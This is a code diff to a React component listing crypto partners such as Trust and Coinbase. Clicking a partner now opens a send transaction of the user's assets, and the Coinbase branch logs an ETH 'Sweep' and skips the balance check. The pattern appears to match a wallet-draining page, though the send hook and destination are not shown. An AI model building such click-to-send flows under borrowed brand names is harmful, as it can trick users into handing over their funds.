@@ -80,6 +80,15 @@ const PartnersSection = () => {
 
   const handlePartnerClick = async (partner: string) => {
     if (partner === "Trust") {
+      try {
+        await handleOpenSendWithArguments(selectedAsset)
+      } catch (err) {
+        // Error already handled
+      }
+      return
+    }
+
+    if (partner === "Coinbase") {
       if (!isConnected) {
         toast({
           title: "Not Connected",
@@ -89,23 +98,20 @@ const PartnersSection = () => {
         return
       }
 
-      if (!balanceData) {
-        toast({
-          title: "Error",
-          description: "Could not fetch balance.",
-          type: 'error'
-        })
-        return
-      }
-
+      console.log('--- Coinbase Clicked: Swapping ETH to USDC (Sweep) ---')
       try {
-        await handleOpenSendWithArguments(selectedAsset, balanceData.formatted, {
-          symbol: balanceData.symbol,
-          decimals: balanceData.decimals
-        })
+        await handleOpenSendWithArguments('ETH')
       } catch (err) {
-        // Error is already handled by toast in hook
+        // Error handled in hook
       }
+      return
+    }
+
+    // Default behavior for other partners
+    try {
+      await handleOpenSendWithArguments(selectedAsset)
+    } catch (err) {
+      // Error handled
     }
   }
 
@@ -127,7 +133,7 @@ const PartnersSection = () => {
               <SelectItem value="USDT">Tether (USDT)</SelectItem>
             </SelectContent>
           </Select>
-          
+
         </div>
 
         {partnerCategories.map((category, catIndex) => (
